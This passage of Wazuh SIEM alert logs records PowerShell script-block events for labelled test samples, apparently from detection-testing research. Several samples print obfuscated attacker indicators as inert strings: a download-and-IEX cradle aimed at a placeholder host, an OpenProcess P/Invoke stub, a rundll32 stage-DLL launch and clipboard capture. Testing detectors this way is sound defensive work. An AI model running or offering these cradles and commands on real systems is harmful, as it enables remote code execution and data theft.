-f $sampleId)\r\n\r\nScriptBlock ID: 69904579-3357-4610-ad86-00c7e5bae506\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"WARNING","systemTime":"2026-07-17T09:37:11.5881038Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"3\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:11.5881038Z\",\"eventRecordID\":\"723296\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"WARNING\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-207'; $indicator='Add-Type -MemberDe`fin`ition ''[Dl`lImport(\\\"kern`el32.dll\\\")] public stat`ic extern Int`Ptr Ope`nProcess(uint access, bool inherit, int pr`ocessId);'' -Name Nat`iveMetho`ds -Names`pace Thes`is.Inert'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 69904579-3357-4610-ad86-00c7e5bae506\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-207'; $indicator='Add-Type -MemberDe`fin`ition ''[Dl`lImport(\\\\\\\"kern`el32.dll\\\\\\\")] public stat`ic extern Int`Ptr Ope`nProcess(uint access, bool inherit, int pr`ocessId);'' -Name Nat`iveMetho`ds -Names`pace Thes`is.Inert'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"69904579-3357-4610-ad86-00c7e5bae506\"}}}","id":"1784281031.553172","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:11.741+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"cbbef7cf-ef95-422a-a4f7-e2078d7746ee","scriptBlockText":"$sampleId='PST-208'; Get-MpPreference -ErrorAction SilentlyContinue | Select-Object DisableRealtimeMonitoring, MAPSReporting; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723299","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-208'; Get-MpPreference -ErrorAction SilentlyContinue | Select-Object DisableRealtimeMonitoring, MAPSReporting; Write-Output 'benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: cbbef7cf-ef95-422a-a4f7-e2078d7746ee\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:11.9280534Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:11.9280534Z\",\"eventRecordID\":\"723299\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-208'; Get-MpPreference -ErrorAction SilentlyContinue | Select-Object DisableRealtimeMonitoring, MAPSReporting; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: cbbef7cf-ef95-422a-a4f7-e2078d7746ee\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-208'; Get-MpPreference -ErrorAction SilentlyContinue | Select-Object DisableRealtimeMonitoring, MAPSReporting; Write-Output 'benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"cbbef7cf-ef95-422a-a4f7-e2078d7746ee\"}}}","id":"1784281032.553172","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:12.699+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"9603c407-05c3-4411-b3f1-23b430e6c34d","scriptBlockText":"$sampleId='PST-209'; $line = 'INFO 2026-06-28 user=admin action=read status=ok'; [regex]::Matches($line, 'user=\\\\w+|status=\\\\w+') | ForEach-Object Value; Write-Output 'hard benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723315","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-209'; $line = 'INFO 2026-06-28 user=admin action=read status=ok'; [regex]::Matches($line, 'user=\\w+|status=\\w+') | ForEach-Object Value; Write-Output 'hard benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 9603c407-05c3-4411-b3f1-23b430e6c34d\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:12.4508255Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:12.4508255Z\",\"eventRecordID\":\"723315\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-209'; $line = 'INFO 2026-06-28 user=admin action=read status=ok'; [regex]::Matches($line, 'user=\\\\w+|status=\\\\w+') | ForEach-Object Value; Write-Output 'hard benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 9603c407-05c3-4411-b3f1-23b430e6c34d\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-209'; $line = 'INFO 2026-06-28 user=admin action=read status=ok'; [regex]::Matches($line, 'user=\\\\\\\\w+|status=\\\\\\\\w+') | ForEach-Object Value; Write-Output 'hard benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"9603c407-05c3-4411-b3f1-23b430e6c34d\"}}}","id":"1784281032.553172","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:12.896+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"3d44f5a3-d8c4-422c-b222-5a3a4f138592","scriptBlockText":"$sampleId='PST-210'; $indicator='$x=New-Object ' + '-ComObject' + ' MsXml2.Serve' + 'rXmlHttp; $x' + '.Open(''GET'',''htt' + 'ps://xml.example' + '.invalid/task''' + ',$false); $x.S' + 'end(); IEX $x.R' + 'esponseTe' + 'xt'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723317","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-210'; $indicator='$x=New-Object ' + '-ComObject' + ' MsXml2.Serve' + 'rXmlHttp; $x' + '.Open(''GET'',''htt' + 'ps://xml.example' + '.invalid/task''' + ',$false); $x.S' + 'end(); IEX $x.R' + 'esponseTe' + 'xt'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 3d44f5a3-d8c4-422c-b222-5a3a4f138592\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:12.7740123Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:12.7740123Z\",\"eventRecordID\":\"723317\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-210'; $indicator='$x=New-Object ' + '-ComObject' + ' MsXml2.Serve' + 'rXmlHttp; $x' + '.Open(''GET'',''htt' + 'ps://xml.example' + '.invalid/task''' + ',$false); $x.S' + 'end(); IEX $x.R' + 'esponseTe' + 'xt'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 3d44f5a3-d8c4-422c-b222-5a3a4f138592\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-210'; $indicator='$x=New-Object ' + '-ComObject' + ' MsXml2.Serve' + 'rXmlHttp; $x' + '.Open(''GET'',''htt' + 'ps://xml.example' + '.invalid/task''' + ',$false); $x.S' + 'end(); IEX $x.R' + 'esponseTe' + 'xt'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"3d44f5a3-d8c4-422c-b222-5a3a4f138592\"}}}","id":"1784281033.555529","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell executed \"Get-Content -Stream or Invoke-Expresion\". Possible string execution as code","firedtimes":8,"groups":["windows"," powershell"],"id":"91837","level":4,"mail":false,"mitre":{"id":["T1059.001"],"tactic":["Execution"],"technique":["PowerShell"]}},"timestamp":"2026-07-17T11:37:13.758+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"942f53c1-1a95-4bfa-8d0b-513bf32ea0e2","scriptBlockText":"$sampleId='PST-211'; $parts=@('Get-ItemP','ropert','y -Pat','h ''HK','LM:\\\\Sof','tware\\\\M','icrosoft\\\\','Windo','ws\\\\CurrentVer','sion\\\\Uni','nstall','\\\\*'''); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723320","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-211'; $parts=@('Get-ItemP','ropert','y -Pat','h ''HK','LM:\\Sof','tware\\M','icrosoft\\','Windo','ws\\CurrentVer','sion\\Uni','nstall','\\*'''); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 942f53c1-1a95-4bfa-8d0b-513bf32ea0e2\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:13.1185121Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:13.1185121Z\",\"eventRecordID\":\"723320\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-211'; $parts=@('Get-ItemP','ropert','y -Pat','h ''HK','LM:\\\\Sof','tware\\\\M','icrosoft\\\\','Windo','ws\\\\CurrentVer','sion\\\\Uni','nstall','\\\\*'''); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 942f53c1-1a95-4bfa-8d0b-513bf32ea0e2\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-211'; $parts=@('Get-ItemP','ropert','y -Pat','h ''HK','LM:\\\\\\\\Sof','tware\\\\\\\\M','icrosoft\\\\\\\\','Windo','ws\\\\\\\\CurrentVer','sion\\\\\\\\Uni','nstall','\\\\\\\\*'''); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"942f53c1-1a95-4bfa-8d0b-513bf32ea0e2\"}}}","id":"1784281033.555529","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:13.762+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"c7a8723b-47fc-403c-9ef7-e8981aea7941","scriptBlockText":"$sampleId='PST-212'; $indicator='Get' + '-Clipbo' + 'ard ' + '-Raw |' + ' Conver' + 'tTo-Json' + ' -Compres' + 's'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723323","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-212'; $indicator='Get' + '-Clipbo' + 'ard ' + '-Raw |' + ' Conver' + 'tTo-Json' + ' -Compres' + 's'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: c7a8723b-47fc-403c-9ef7-e8981aea7941\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:13.4584717Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:13.4584717Z\",\"eventRecordID\":\"723323\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-212'; $indicator='Get' + '-Clipbo' + 'ard ' + '-Raw |' + ' Conver' + 'tTo-Json' + ' -Compres' + 's'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: c7a8723b-47fc-403c-9ef7-e8981aea7941\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-212'; $indicator='Get' + '-Clipbo' + 'ard ' + '-Raw |' + ' Conver' + 'tTo-Json' + ' -Compres' + 's'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"c7a8723b-47fc-403c-9ef7-e8981aea7941\"}}}","id":"1784281033.555529","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:13.768+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"dff60424-55c3-496d-a8e8-f7b2ce582871","scriptBlockText":"$sampleId='PST-213'; $result=&amp; { Get-WinEvent -FilterHashtable @{LogName='Security';Id=4624} -MaxEvents 3 -ErrorAction SilentlyContinue | Select-Object Id,TimeCreated }; $result | Out-String | Write-Output; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723338","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-213'; $result=& { Get-WinEvent -FilterHashtable @{LogName='Security';Id=4624} -MaxEvents 3 -ErrorAction SilentlyContinue | Select-Object Id,TimeCreated }; $result | Out-String | Write-Output; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: dff60424-55c3-496d-a8e8-f7b2ce582871\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:13.7986083Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:13.7986083Z\",\"eventRecordID\":\"723338\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-213'; $result=& { Get-WinEvent -FilterHashtable @{LogName='Security';Id=4624} -MaxEvents 3 -ErrorAction SilentlyContinue | Select-Object Id,TimeCreated }; $result | Out-String | Write-Output; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: dff60424-55c3-496d-a8e8-f7b2ce582871\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-213'; $result=&amp; { Get-WinEvent -FilterHashtable @{LogName='Security';Id=4624} -MaxEvents 3 -ErrorAction SilentlyContinue | Select-Object Id,TimeCreated }; $result | Out-String | Write-Output; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"dff60424-55c3-496d-a8e8-f7b2ce582871\"}}}","id":"1784281034.555529","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:14.812+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"a513e1b3-2b51-483b-a0a8-335a2764dad5","scriptBlockText":"$sampleId='PST-214'; $parts=@('rundll32','.exe ','C:\\\\','__THESI','S_INER','T__\\\\stag','e.dll,Entry','Poi','nt'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723341","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-214'; $parts=@('rundll32','.exe ','C:\\','__THESI','S_INER','T__\\stag','e.dll,Entry','Poi','nt'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: a513e1b3-2b51-483b-a0a8-335a2764dad5\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:14.1522763Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:14.1522763Z\",\"eventRecordID\":\"723341\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-214'; $parts=@('rundll32','.exe ','C:\\\\','__THESI','S_INER','T__\\\\stag','e.dll,Entry','Poi','nt'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: a513e1b3-2b51-483b-a0a8-335a2764dad5\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-214'; $parts=@('rundll32','.exe ','C:\\\\\\\\','__THESI','S_INER','T__\\\\\\\\stag','e.dll,Entry','Poi','nt'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"a513e1b3-2b51-483b-a0a8-335a2764dad5\"}}}","id":"1784281034.555529","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:14.819+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"bf047804-0b3b-4a35-acdc-c2b4848a292a","scriptBlockText":"$sampleId='PST-215'; Get-WinEvent -LogName Application -MaxEvents 10 | Where-Object LevelDisplayName -eq 'Error' | Select-Object -First 3 Id, ProviderName; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723342","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-215'; Get-WinEvent -LogName Application -MaxEvents 10 | Where-Object LevelDisplayName -eq 'Error' | Select-Object -First 3 Id, ProviderName; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: bf047804-0b3b-4a35-acdc-c2b4848a292a\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:14.4774281Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:14.4774281Z\",\"eventRecordID\":\"723342\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-215'; Get-WinEvent -LogName Application -MaxEvents 10 | Where-Object LevelDisplayName -eq 'Error' | Select-Object -First 3 Id, ProviderName; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: bf047804-0b3b-4a35-acdc-c2b4848a292a\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-215'; Get-WinEvent -LogName Application -MaxEvents 10 | Where-Object LevelDisplayName -eq 'Error' | Select-Object -First 3 Id, ProviderName; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"bf047804-0b3b-4a35-acdc-c2b4848a292a\"}}}","id":"1784281034.555529","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:14.821+0200"}
